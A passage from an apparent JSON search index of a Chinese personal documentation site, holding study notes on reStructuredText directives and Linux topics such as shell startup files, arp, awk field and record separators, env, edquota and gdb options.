Python, *the* best language around\n.. _Python: https://www.python.org/ unicode 用于转换Unicode字符, 没什么应用场景, 见 unicode-character-codes date 用于嵌入当前日期, 格式等同于 time 模块的 time.strftime() 默认格式为 %Y-%m-%d 例, 源码: .. |date| date::\n.. |time| date:: %H:%M\n\n今天是 |date|.\n\n文档被创建与 |date| at |time|. 效果 今天是 2024-06-07. 文档被创建与 2024-06-07 at 15:20.","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Directives-for-substitution-definitions.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Directives-for-substitution-definitions.html"},{"title":"Document Parts","text":"contents 生成当前文档目录 支持命令选项 depth: integer 目录深度, 默认不限制 local: flag (empty) 生成本地目录。条目将仅包括提供小节(flag)的子节。如果没有给出显式标题，目录将不会有标题。 backlinks: \"entry\" or \"top\" or \"none\" 从部分标题生成链接回到目录条目、目录本身，或不生成反向链接 class: text 设置类属性 用例, 源码: .. contents:: Here's a very long Table of\n  Contents AAAAAA 效果 Here's a very long Table of\nContents AAAAAA contents header / footer header / footer \"标题\"和\"页脚\"指令创建文档装饰，可用于页面导航、注释、时间/测试等。 例如: .. header:: This space for rent BBBBBBBB. 这将向文档标题添加一个段落，该段落将显示在生成的网页顶部或每个打印页面的顶部。 这些指令可以累计多次使用。目前只支持一个页眉和页脚。 警告 实际测试不适用于rst生成的文档, 无任何效果, 弃之.","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Document-parts.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Document-parts.html"},{"title":"Images","text":"Image 支持类型 image 支持的命令选项: alt: text 当应用不能加载图片时, 显示的文字 height: length 图片高度 width: length or percentage of the current line width 图片宽度 scale: integer percentage (the \"%\" symbol is optional) 图片缩放, 以百分比的形式, 默认 100% align: \"top\", \"middle\", \"bottom\", \"left\", \"center\", or \"right\" 图片位置 target: text (URI or reference name) 图片可被点击, 支持两种形式:\n- url, 点击跳转到url\n- 可以通过类似这样 `a name`_ 跳转 and the common options class and name. 示例, 源码: .. image:: ../../resources/images/2023-02-02-15-11-21.png\n  :alt: test_image\n  :scale: 50%\n  :align: center\n  :target: https://www.baidu.com Figure 命令类型: figure 与image的区别是, 可以在图片下标注文字段落(可选). 源码: .. figure:: ../../../resources/images/2023-02-02-15-55-24.png\n  :scale: 50 %\n  :alt: map to buried treasure\n\n  This is the caption of the figure (a simple paragraph).\n\n  The legend consists of all elements after the caption.  In this\n  case, the legend consists of this paragraph and the following\n  table:\n\n  +----------------------------------------------------------------+-----------------------+\n  | Symbol                                                         | Meaning               |\n  +================================================================+=======================+\n  | .. image:: ../../../resources/images/2023-02-02-15-55-24.png   |                       |\n  |    :scale: 30%                                                 | Campground            |\n  |    :alt: Campground                                            |                       |\n  +----------------------------------------------------------------+-----------------------+\n  | .. image:: ../../../resources/images/2023-02-02-15-55-24.png   |                       |\n  |    :scale: 30%                                                 | Lake                  |\n  |    :alt: Lake                                                  |                       |\n  +----------------------------------------------------------------+-----------------------+\n  | .. image:: ../../../resources/images/2023-02-02-15-55-24.png   |                       |\n  |    :scale: 30%                                                 | Mountain              |\n  |    :alt: Mountain                                              |                       |\n  +----------------------------------------------------------------+-----------------------+\n\n  .. csv-table::\n    :header: Symbol, Meaning\n\n    .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Campground\n    .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Lake\n    .. image:: ../../../resources/images/2023-02-02-15-55-24.png , Mountain 效果 This is the caption of the figure (a simple paragraph). The legend consists of all elements after the caption.  In this\ncase, the legend consists of this paragraph and the following\ntable: Symbol Meaning Campground Lake Mountain Symbol Meaning Campground Lake Mountain 支持命令选项, 除了支持image的所有选项外, 还支持以下选项: align: \"left\", \"center\", or \"right\" 此处列出主要说明只支持以上三个参数 figwidth: \"image\", length, or percentage of current line width 注意更改的是所在区域的宽度而非图片宽度. 当参数值为图片路径时: 若图片不存在, 则忽略此选项; 若存在则使用该图片的真实宽度值(依赖python的Imaging库). 实际运作可参考下图: +---------------------------+\n|        figure             |\n|                           |\n|<------ figwidth --------->|\n|                           |\n|  +---------------------+  |\n|  |     image           |  |\n|  |                     |  |\n|  |<--- width --------->|  |\n|  +---------------------+  |\n|                           |\n|The figure's caption should|\n|wrap at this width.        |\n+---------------------------+ figclass: text 设置 classes 属性, 暂时不知道有什么用","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Images.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Images.html"},{"title":"Miscellaneous","text":"include 嵌入文件内容, 不建议使用. 见 including-an-external-document-fragment 警告 \"include\"指令代表一个潜在的安全漏洞。可以通过\"file_insertion_enabled\"运行时设置禁用它。 raw raw也存在安全问题, 故不建议使用. 支持的命令选项: file: string (newlines removed) 本地文件路径 url: string (whitespace removed) 文件网络路径 encoding: string 文件读取格式, 默认输入文件格式 raw可以将内容转换对应的格式, 如html, 例: 源码: .. raw:: html\n\n  <hr width=500 size=10 color=red> 效果","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Miscellaneous.html","loc":"/yq-docs-document-RST-mark-language-DOC-grammar-module-Miscellaneous.html"},{"title":"插入图片","text":"图片插入, 有以下指令可实现: image figure image 如: .. image:: ../resources/images/images/2022-11-03-14-24-31.png 支持选项: height 图像高度 width 图像宽度 scale 图像缩放, 百分比。 align 可为top, middle, bottom, left, center, right, 设置图像对齐方式 target 点击跳转 figure 如: .. figure:: ../resources/images/images/2022-11-03-14-24-31.png figure 可以自定义图片相关, 除了上面, 支持额外选项, 支持写图片备注 align 可为 left, center, right。 只能设置水平方向上的对齐方式 figwidth 设置图像宽度, 这将影响图像标题和图例的折行方式, 以确保它们的宽度不会超过这个值。\n但是这并不影响内嵌的图片宽度, 图片的宽度需要用 width 选项设置: +---------------------------+\n|        figure             |\n|                           |\n|<------ figwidth --------->|\n|                           |\n|  +---------------------+  |\n|  |     image           |  |\n|  |                     |  |\n|  |<--- width --------->|  |\n|  +---------------------+  |\n|                           |\n|The figure's caption should|\n|wrap at this width.        |\n+---------------------------+","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-Insert-picture.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-Insert-picture.html"},{"title":"列表","text":"符号列表 可用符号: -、*、+ 无序列表: - hhhhhhhh\n- hhhhhhhh\n- hhhhhhhh\n- hhhhhhhh\n- hhhhhhhh\n- hhhhhhhh 有序列表, 支持数字、大小写字母和罗马数字: 1. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh\n\na. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh\n#. hhhhhhhh","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-List.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-List.html"},{"title":"引用","text":"内部引用 即在同一个文件内的引用 对于同文件内的所有标题, 会自动存在引用链接 如有一个小节: 小节1\n=================== 可以直接 加后下划线 引用: 小节1_ 注解 默认仅可用于当前rst文本 . 若需要支持小节能被所有文档引用, 需要在conf.py 配置 sphinx.ext.autosectionlabel .\n不建议这么做, 因为如果存在重复标题会有冲突. 全文引用-标签引用 引用某一个位置 不仅可用于同一个文件内, 还可用在同文档项目的其他文件 目标位置(被引用位置)形式: .. _这是一个引用2: 引用位置的写法1(与上一节一致): 这是一个引用2_ 引用位置的写法2, 使用 ref :ref:`这是一个引用2` . 注解 ref 支持跨文档引用,\n但是要注意夸文档引用定义的标签必须在标题前面(这个确定),\n或者在标签下定义其内容结构(这个还没试过),\n否则跨文档时无法找到 注意 ref 默认是找的是 title 与 caption,\n需要支持小节的话, 需要在小节前面定义别名如下 或者使用内置拓展插件 sphinx.ext.autosectionlabel 直接支持小节 全文引用-引用整个文档 引用整个文档 使用doc指令, 直接引用rst文档(冒号后无空格): :doc:`引用pytest, test <../python/Pytest>`.\n:doc:`../python/Pytest`. 超链接 主要用于引用外部网址 如链接到百度: `百度 <https://www.baidu.com>`_ 此时 百度 会被识别为一个 target , 注意这个 target 不要有重复 效果: 百度 由于存在 target , 故可定义在其他地方: `百度`_ 效果, 百度 或者提前定义网址: .. _百度: https://www.baidu.com","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-Quote.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-Quote.html"},{"title":"侧边栏","text":"使用 sidebar 模块 Optional Sidebar Title Optional Sidebar Subtitle Subsequent indented lines comprise\nthe body of the sidebar, and are\ninterpreted as body elements. 源码: .. sidebar:: Optional Sidebar Title\n  :subtitle: Optional Sidebar Subtitle\n\n  Subsequent indented lines comprise\n  the body of the sidebar, and are\n  interpreted as body elements. 再有一个其他的啥","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-Sidebar.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-Sidebar.html"},{"title":"文本样式","text":"星号 单星号表示斜体 单星号, 字体斜体 .\n源码: *单星号, 字体斜体* 双星号表示加粗 双星号, 字体粗体 .\n源码: **双星号, 字体粗体** 反引号 单反引号, 表示斜体 源码: `单反引号, 表示斜体` 双反引号, 代码示例/行内文本. 说明: 通常显示为等宽文本, 空格可以保留, 换行不保留 源码: ``双反引号, 代码示例/行内文本. 说明: 通常显示为等宽文本, 空格可以保留, 换行不保留``","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-Text-style.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-Text-style.html"},{"title":"段落","text":"段落是被空行分割的文字片段, 左侧必须对齐（没有空格, 或者有相同多的空格）。 缩进的段落被视为引文。","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-paragraph.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-paragraph.html"},{"title":"标题","text":"标题可以用连续的符号下线表示, 上线可有可无: ========================= 可以使用的标题符号有 =、-、`、:、'、\"、~、&#94;、_ 、* 、+、 #、<、> , 注意: 长度大于标题长度, 连续使用表示同级标题, 不同的符号使用表示下一级标题 对于相同的符号, 有上标是一级标题, 没有上标是二级标题 (一级标题上下标都要有)。 标题最多分六级","tags":"文档","url":"/yq-docs-document-RST-mark-language-Grammar-module-title.html","loc":"/yq-docs-document-RST-mark-language-Grammar-module-title.html"},{"title":"React组件库","text":"","tags":"前端","url":"/yq-docs-front-end-frame-react-Component-library-index.html","loc":"/yq-docs-front-end-frame-react-Component-library-index.html"},{"title":"shell类型","text":"大致与 linux系统环境加载顺序 一致 登录shell 交互式登陆 直接通过终端输入用户信息登陆系统 如: su - username\n#或\nsu -l username 配置文件读取过程: /etc/profile --> /etc/profile.d/*.sh --> ~/.bash_profile --> /etc/bashrc 交互式登录shell: Bash reads and executes the /etc/profile (if it exists).\n\nAfter reading that file, it looks for ~/.bash_profile, ~/.bash_login, and ~/.profile in that order, and reads and executes the first one (that exists and is readable).  When a login shell exits: Bash reads and executes ~/.bash_logout (if it exists). 非交互式登陆 图形界面的终端 执行脚本 如: su username 配置文件读取过程: ~/.bashrc/ --> /etc/bash_rc --> /etc/profile.d/*.sh 交互式非登陆shell: Bash reads and executes ~/.bashrc (if it exists) 登陆Linux的时候执行的文件过程: /etc/profile --> (~/.bash_profile | ~/.bash_login | ~/.profile) --> ~/.bashrc --> /etc/bashrc --> ~/.bash_logout 参考: http://groups.google.com/group/linux.debian.user/browse_thread/thread/2b71ecfc45789958/7bff24e3bae74b36?lnk=raot 详加载顺序可见 linux系统环境加载顺序 选项/参数 短选项(参数) 短横线加字母, 如: -h\n-a $option_arg 长选项(参数) 双短横线加单词, 如: --help\n--add $option_arg 普通参数 直接跟在后面的, 如: 'commit msg' 或者直接以双短横线开始作为分隔符的, 如: # 两个横线后面的部分都会被认为是参数了，而不再是前面的命令的选项了\n-- 'commit msg'\n\n# 单横线也可以其实\n- 'commit msg' 注解 bash的man page: A -- signals the end of options and disables further option\nprocessing. Any arguments after the -- are treated as filenames and\narguments. An argument of - is equivalent to --.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-shell-type.html","loc":"/yq-docs-operating-system-linux-Conceptual-shell-type.html"},{"title":"arp","text":"arp 命令用于显示和修改 IP 到 MAC 转换表 arp 命令 是 Address Resolution Protocol，地址解析协议，\n是通过解析网络层地址来找寻数据链路层地址的一个网络协议包中极其重要的网络传输协议。\n而该命令可以显示和修改 arp 协议解析表中的缓冲数据。 这个核心协议模块实现RFC826中定义的 Address Resolution Protocol [译注：即TCP/IP的第三层到第一层的地址转换协议]，\n用于在直接相连的网络中换第二层硬件地址和 Ipv4 协议地址之间的转换。\n用户除非想对其进行配置，否则一般不会直接操作这个模块。 实际上，它提供对核心中其它协议的服务。 用户进程可以使用 packet(7) 的 sockets，收到 ARP 包（译注：一译分组）。\n还有一种机制是使用 netlink(7) sockets，在用户空间管理 ARP 缓存的机制。\n我们也可以通过 ioctl (2) 控制任意 PF_INET socket上的 ARP 表 ARP 模块维护一个硬件地址到协议地址映射的缓存。\n这个缓存有大小限制，所以不常用的和旧的记录（Entry）将被垃圾收集器清除（garbage-collected），\n垃圾收集器永远不能删除标为永久的记录。\n我们可以使用ioctls直接操纵缓冲， 并且其性状可以用下面定义的 sysctl 调节。 如果在限定的时间（见下面的sysctl）内，一条现存映射没有肯定反馈时，\n则认为相邻层的缓存记录失效。\n为了再次向目标发送数据，ARP将首先试着询问本地arp进程 app_solicit 次，\n获取更新了的 MAC（介质访问控制）地址。\n如果失败，并且旧的MAC地址是已知的，则发送 ucast_solicit 次的 unicast probe。\n如果仍然失败，则将向网络广播一个新的ARP请求,此时要 有待发送数据的队列 如果 Linux 接到一个地址请求，而且该地址指向 Linux 转发的地址，\n并且接收接口打开了代理 arp 时，Linux 将自动添加一条非永久的代理 arp 记录；\n如果存在拒绝到目标的路由，则不添加代理 arp 记录。 语法: arp（选项）（参数） 选项 -a 主机 ：显示 arp 缓冲区的所有条目； -H 地址类型 ：指定 arp 指令使用的地址类型； -D 使用指定接口的硬件地址； -e 以 Linux 的显示风格显示 arp 缓冲区中的条目； -f 文件 ：设置主机的 IP 地址与 MAC 地址的静态映射。 -n 以数字方式显示 arp 缓冲区中的条目； -v 显示详细的 arp 缓冲区条目，包括缓冲区条目的统计信息； -s <主机> <MAC地址> 主机 MAC 地址 ：设置指定的主机的 IP 地址与 MAC 地址的静态映射； -d <主机> 主机 ：从 arp 缓冲区中删除指定主机的 arp 条目； -i <接口> 接口 ：指定要操作 arp 缓冲区的网络接口； 如: [root@cs6 ~]# arp -n\nAddress HWtype HWaddress Flags Mask Iface\n10.0.0.1 ether 00:50:56:c0:00:08 C eth0\n10.0.0.2 ether 00:50:56:f4:fb:52 C eth0 命令说明具体如下 Address 主机地址。 Hwtype 硬件类型。 Hwaddress 硬件地址。 Flags Mask 记录标志，\"C\"表示arp高速缓存中的条目，\"M\"表示静态的arp条目。 lface 网络接口。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ARP.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ARP.html"},{"title":"awk","text":"文本和数据进行处理的编程语言 选项参数: -F <fs> fs指定分割符 -v<var= value> 赋值一个用户变量，将外部变量传递给awk -f <script> 从脚本文件中读取awk命令 -m <[fr] val> 对val值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能时Bell实验室awk拓展的功能，在标准awk不适用。 其他: $n    当前记录的第n个字段，$开头都表示字段 模式 /正则表达式/：使用通配符的拓展集 关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试 模式匹配表达式：用运算符 ~ （匹配）和 !~ （不匹配） BEGIB语句块、pattern语句块、END语句块：参见awk的工作原理 注解 语句块的书写, 最外层一定是单引号包裹, 如: $ echo \"mysql                    <none>             57da161f45ac   12 months ago   517MB\" | awk '{print $3}'\n57da161f45ac 因为其内部是脚本内容, 用双引号, 会就地解析, 比如这里就是 $3 解析成当前的参数 awk内置变量（预定义变量） 常用 NF 字段个数，（读取的列数） 每一行 $0 拥有的字段总数 NR 记录数（行号），从1开始，新的文件延续上面的计数，新文件不从1开始. 目前awk所处理的第几行的数据 FNR 读取文件的记录数（行号），从1开始，新的文件重新从1开始计数 FS(Field Separator) 输入字段分隔符，默认是空格 OFS(Out of Field Separator) 输出字段分隔符 默认也是空格 RS(Record Separator) 输入行分隔符，默认为换行符 ORS(Output Record Separate) 输出行分隔符，默认为换行符 注解 RS、ORS、FS、OFS的英文解释绝不是这样的，这里只是解释清楚。建议去阅读awk的英文读物，其中解释了缩写的含义 其他参考 关于Field与Record 所有 说明：ANPG表示第一个支持变量的工具，[A]=awk、[N]=nawk、[P]=POSIXawk、[G]=gawk: $n  当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。\n$0  这个变量包含执行过程中当前行的文本内容。\n[N]  ARGC  命令行参数的数目。\n[G]  ARGIND  命令行中当前文件的位置（从0开始算）。\n[N]  ARGV  包含命令行参数的数组。\n[G]  CONVFMT  数字转换格式（默认值为%.6g）。\n[P]  ENVIRON  环境变量关联数组。\n[N]  ERRNO  最后一个系统错误的描述。\n[G]  FIELDWIDTHS  字段宽度列表（用空格键分隔）。\n[A]  FILENAME  当前输入文件的名。\n[P]  FNR  同NR，但相对于当前文件。\n[A]  FS  字段分隔符（默认是任何空格）。\n[G]  IGNORECASE  如果为真，则进行忽略大小写的匹配。\n[A]  NF  表示字段数，在执行过程中对应于当前的字段数。\n[A]  NR  表示记录数，在执行过程中对应于当前的行号。\n[A]  OFMT  数字的输出格式（默认值是%.6g）。\n[A]  OFS  输出字段分隔符（默认值是一个空格）。\n[A]  ORS  输出记录分隔符（默认值是一个换行符）。\n[A]  RS  记录分隔符（默认是一个换行符）。\n[N]  RSTART  由match函数所匹配的字符串的第一个位置。\n[N]  RLENGTH  由match函数所匹配的字符串的长度。\n[N]  SUBSEP  数组下标分隔符（默认值是34）。 BEGIN末尾的非0数字表示输出 这里非0数字可以理解为true: echo -e \"111\\n222\" | awk -v a=3 -v val=god 'BEGIN{FS=OFS=\",\"}{$a=val}1'\n\n111,,god\n222,,god awk中$NF是什么意思? #pwd\n/usr/local/etc\n~# echo $PWD | awk -F/ '{print $NF}'\netc\n#NF代表：浏览记录的域的个数\n#$NF代表  ：最后一个Field(列) 原文链接:: https://blog.csdn.net/qq_41673534/article/details/80252016 linux：awk之RS、ORS与FS、OFS 把ORS理解成RS反过程，这样更容易记忆和理解 ，看下面的例子: [zhangy@localhost test]$ awk 'BEGIN{ORS=\"\\n\"}{print $0}' test1  //awk '{print $0}' test1二者是一样的\n111 222\n333 444\n555 666\n[zhangy@localhost test]$ awk 'BEGIN{ORS=\"|\"}{print $0}' test1\n111 222|333 444|555 666| FS为空的时候: [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"\"}{NF++;print $0}'\n1 1 1 | 2 2 2 | 3 3 3 当FS为空的时候，awk会把一行中的每个字符，当成一列来处理 。 关于Field与Record 什么是field（字段），什么是record（记录行）？ 示例: 1.txt\n\n1. i am a student.\n2. i like to swim\n3. hello moto 1代表第一个记录行，2代表第二个记录行，3代表第三个记录行。\n通过观察我们可以知道总共有3个记录行（record）。 看看第一行：\"i am a student\"，这一行的每个单词都是一个字段（field）。\n\"i\"是一个字段，\"am\"是一个字段，\"a\"是一个字段，\"student\"是一个字段，\n该行总共有4个字段。 RS 记录行分隔符, 示例: 1.txt\n\n1. a\\n\n2. b\\n\n3. c\\n\n4. d\\n\n5. e\\n 该文本总共有5行，每一行都有一个换行符\"n\"。\n所以每行记录都是以\"n\"为一个（换行的）标志。 可以用以下方法来理解： 找到某某标志，让每个某某后的内容重新变成一行 示例: 1.txt\n\na|b|c 代码: awk 'BEGIN{ RS=\"|\"; } { print $0 }'\n\na\nb\nb ORS 可以看成RS的逆向过程, 示例: 1.txt\n\na\nb\nc 可以这样理解： 观察每一行的\"换行符号\"，然后将\"换行符号\"替换成你想要的符号: awk 'BEGIN{ ORS=\"----\" }{ print $0 }' 1.txt\n\na----b----c---- FS 字段分隔符 FS默认值为\" （空格）\",如\"hello moto\". 在\"hello moto\"中有一个空格，空格就是hello与moto的分隔符（separator），而hello与moto就为字段（files）。awk以空格来区分。 在看看\"i----love----you\",如果我们用命令\"awk \"{ print $1 }\"\"会看到结果为: i----love----you 如果想打印出三个字母，通过观察可发现\"----\"为分隔符: awk 'BEGIN{ FS=\"----\";}{ print $1,$2,$3 }' filename\n\ni love you OFS 输出的字段分隔符。 这么解释吧，如上例中\"i----love----you\"，\"----\"为分隔符(FS)，如果我们想改为用其他符号显示可以这样: awk 'BEGIN{ FS=\"----\";OFS=\"*****\" }{ print $1,$2,$3 }' filename\n\ni*****love*****you 其实OFS还有一个例子: echo \"abc\" | awk '{ OFS=\".\" } { NF=NF; print NF,$0}' 结果: 1.abc PS RS与ORS可以说成是一个互逆的过程（↔）也可以看成一个替换的过程，\n但是看成互逆的过程比较好理解；FS与OFS就是一个替换的过程。 RS,ORS,FS,OFS区别和联系 平常用的: print $0 等价于: printf $0 ORS RS与ORS RS是记录分隔符，默认的分隔符是 \\n ，具体用法看下: [root@krlcgcms01 mytest]# cat test1     //测试文件\n111 222\n333 444\n555 666 RS默认分割符 \\n : [root@krlcgcms01 mytest]# awk '{print $0}' test1  //awk 'BEGIN{RS=\"\\n\"}{print $0}' test1 这二个是一样的\n111 222\n333 444\n555 666 其实你可以把上面test1文件里的内容理解为: 111 222\\n333 444\\n555 6666 利用 \\n 进行分割。看下一个例子 自定义RS分割符 : [zhangy@localhost test]$ echo \"111 222|333 444|555 666\"|awk 'BEGIN{RS=\"|\"}{print $0,RT}'\n111 222 |\n333 444 |\n555 666 结合上面一个例子，就很容易理解RS的用法了 RS也可能是正则表达式 : [zhangy@localhost test]$ echo \"111 222a333 444b555 666\"|awk 'BEGIN{RS=\"[a-z]+\"}{print $1,RS,RT}'\n111 [a-z]+ a\n333 [a-z]+ b\n555 [a-z]+ 从例3和例4，我们可以发现一点， 当RT是利用RS匹配出来的内容。如果RS是某个固定的值时，RT就是RS的内容 。 RS为空时 : [zhangy@localhost test]$ cat -n test2\n1  111 222\n2\n3  333 444\n4  333 444\n5\n6\n7  555 666\n[zhangy@localhost test]$ awk 'BEGIN{RS=\"\"}{print $0}' test2\n111 222\n333 444\n333 444\n555 666\n[zhangy@localhost test]$ awk 'BEGIN{RS=\"\";}{print \"<\",$0,\">\"}' test2  //这个例子看着比较明显\n< 111 222 >\n< 333 444     //这一行和下面一行，是一行\n333 444 >\n< 555 666 > 从这个例子， 可以看出当RS为空时，awk会自动以多行来做为分割符 。 ORS记录输出分符符，默认值是 ``n`` 把ORS理解成RS反过程，这样更容易记忆和理解 ，看下面的例子: [zhangy@localhost test]$ awk 'BEGIN{ORS=\"\\n\"}{print $0}' test1  //awk '{print $0}' test1二者是一样的\n111 222\n333 444\n555 666\n[zhangy@localhost test]$ awk 'BEGIN{ORS=\"|\"}{print $0}' test1\n111 222|333 444|555 666| FS与OFS FS指定列分割符 : [zhangy@localhost test]$ echo \"111|222|333\"|awk '{print $1}'\n111|222|333\n[zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"|\"}{print $1}'\n111 FS也可以用正则 : [zhangy@localhost test]$ echo \"111||222|333\"|awk 'BEGIN{FS=\"[|]+\"}{print $1}'\n111 FS为空的时候 : [zhangy@localhost test]$ echo \"111|222|333\"|awk 'BEGIN{FS=\"\"}{NF++;print $0}'\n1 1 1 | 2 2 2 | 3 3 3 当FS为空的时候，awk会把一行中的每个字符，当成一列来处理 。 RS被设定成非 ``n`` 时， ``n`` 会成FS分割符中的一个 [zhangy@localhost test]$ cat test1\n111 222\n333 444\n555 666\n[zhangy@localhost test]$ awk 'BEGIN{RS=\"444\";}{print $2,$3}' test1\n222 333\n666 222和333之间是有一个 ``n`` 的，当RS设定成444后，222和333被认定成同一行的二列了，其实按常规思想是二行的一列才对 。 OFS列输出分隔符 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $1,$2}' test1\n111|222\n333|444\n555|666\n[zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $1 OFS $2}' test1\n111|222\n333|444\n555|666 test1只有二列，如果100列，都写出来太麻烦了吧。 [zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{print $0}' test1\n111 222\n333 444\n555 666\n[zhangy@localhost test]$ awk 'BEGIN{OFS=\"|\";}{NF=NF;print $0}' test1\n111|222\n333|444\n555|666 为什么第二种方法中的OFS生效呢？个人觉得， awk觉查到列有所变化时，就会让OFS生效 ，没变化直接输出了。","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-AWK.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-AWK.html"},{"title":"env","text":"env 显示系统中已经存在的环境变量（当前用户），只使用\"-\"时，隐藏了\"-i\"的功能 -i 开始一个新的空环境 -u <变量名> 从当前环境中删除指定的变量 其他用法, 临时为某个执行的cmd设置一个环境变量, 仅在执行的这个cmd生效: env var=xxx cmd set不加任何参数显示结果于env的区别 set 命令 set 命令会显示当前 shell 的环境变量和位置参数，\n以及其他与当前 shell 会话相关的设置（如 shell 函数和别名）.\n它还会显示一些内部变量和状态信息.\n输出结果包含更多与 shell 相关的信息，而不仅仅是环境变量.\n此外，set 命令还可以用于设置变量或修改 shell 的行为. env 命令 env 命令会显示当前环境中的环境变量.\n它主要用于显示环境变量的值，而不包含其他与 shell 会话相关的信息.\nenv 命令的输出结果通常比较简洁，只包含环境变量的名称和值。 区别 指令export、env、set三者的区别","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-ENV.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-ENV.html"},{"title":"edquota","text":"修改用户（群组）的磁盘配额 edit quota 缩写，用于修改用户和群组的配额限制参数，\n包括磁盘容量和文件个数限制、软限制和硬限制值、宽限时间，\n该命令的基本格式有以下 3 种: [root@localhost ~]# edquota [-u 用户名] [-g 群组名]\n[root@localhost ~]# edquota -t\n[root@localhost ~]# edquota -p 源用户名 -u 新用户名 此命令各常用选项及功能如下： -u 用户名 进入配额的 Vi 编辑界面，修改针对用户的配置值； -g 群组名 进入配额的 Vi 编辑界面，修改针对群组的配置值； -t 修改配额参数中的宽限时间； -p 将源用户（或群组）的磁盘配额设置，复制给其他用户（或群组） 例如，以用户 myquota 为例，通过如下命令配置此命令的 Quota: [root@localhost ~]# edquota -u myquota\nDisk quotas for user myquota (uid 710):\nFilesystem  blocks soft  hard inodes soft hard\n/dev/hda3     80   0   0   10   0   0 此命令的输出信息共 3 行，\n第一行指明了针对哪个用户进行配额限制，\n第二行是各个配额值的表头，\n共分为 7 列，其每一列的含义 文件系统（filesystem） 说明该限制值是针对哪个文件系统（或分区）； 磁盘容量（blocks） 此列的数值是 quota 自己算出来的，单位为 Kbytes，不要手动修改； 磁盘容量的软限制（soft） 当用户使用的磁盘空间超过此限制值，则用户在登陆时会收到警告信息，告知用户磁盘已满，单位为 KB； 磁盘容量的硬限制（hard） 要求用户使用的磁盘空间最大不能超过此限制值，单位为 KB； 文件数量（inodes） 同 blocks 一样，此项也是 quota自己计算出来的，无需手动修改； 文件数量的软限制（soft） 当用户拥有的文件数量超过此值，系统会发出警告信息； 文件数量的硬限制（hard） 用户拥有的文件数量不能超过此值。 注意，当 soft/hard 为 0 时，表示没有限制。\n另外，在 Vi（或 Vim）中修改配额值时，填写的数据无法保证同表头对齐，\n只要保证此行数据分为 7 个栏目即可。 【例 1】 修改用户 myquota 的软限制值和硬限制值: [root@localhost ~]# edquota -u myquota\nDisk quotas for user myquota (uid 710):\nFilesystem  blocks  soft  hard inodes soft hard\n/dev/hda3     80 250000 300000   10   0   0 【例 2】 修改群组 mygrpquota 的配额: [root@localhost ~]# edquota -g mygrpquota\nDisk quotas for group mygrpquota (gid 713):\nFilesystem  blocks  soft   hard inodes soft hard\n/dev/hda3    400 900000 1000000   50   0   0 【例 3】修改宽限天数: [root@localhost ~]# edquota -t\nGrace period before enforcing soft limits for users:\nTime units may be: days, hours, minutes, or seconds\nFilesystem     Block grace period   Inode grace period\n/dev/hda3        14days         7days","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-Edquota.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-Edquota.html"},{"title":"gdb","text":"使用: bt                    #打印当前的堆栈信息 backtrace 常用模板: gdb exefile corefile -x script\ngdb --core corefile exefile -x script\ngbd -c corefile exefile -x script\ngdb exefile corefile < script 前三者基本等价，最后一个不确定 常用选项 -n x , -n 不执行任何初始化文件里的命令。通常在处理所有的命令此选项和参数之后，GDB 会执行这些文件里的命令。 -q uite , -s ilent , -q \"安静模式\"，不打印介绍和版权信息。在批处理模式下也不打印。 -b atch 以批处理模式运行。\n处理完所有命令文件后以 0 状态推出。批处理模式将在 GDB 作为过滤器运的时候很有用，例如下载和运行一个远程计算机上的程序。 -symbols <file>, -s <file> 从指定的文件中读取符号表。 -se <file> 从指定文件中读取符号表信息，并把它用在可执行文件中。 -core <file>, -c <file> 调试 core dump 的 core 文件， core dump 叫做核心转储，它是进程运行时在突然崩溃的那一刻的一个内存快照，操作系统在程序发生异\n常而异常在进程内部又没有被捕获的情况下，会把进程此刻内存、寄存器状态、运行堆栈等信息转储保存在一个文件里。 -directory <directory>, -d <directory> 加入一个源文件的搜索路径。默认搜索路径是环境变量中的 PATH 所定义的路径。 -tty device, -t device 将设备作为程序的标准输入输出。 -t ui 在启动时激活文本用户接口。文本用户接口在终端上管理多种文本窗口，用来显示代码，汇编，寄存器和 GDB 命令的输出。 -w rite 以可读可写的方式打开可执行程序和 core 文件，和 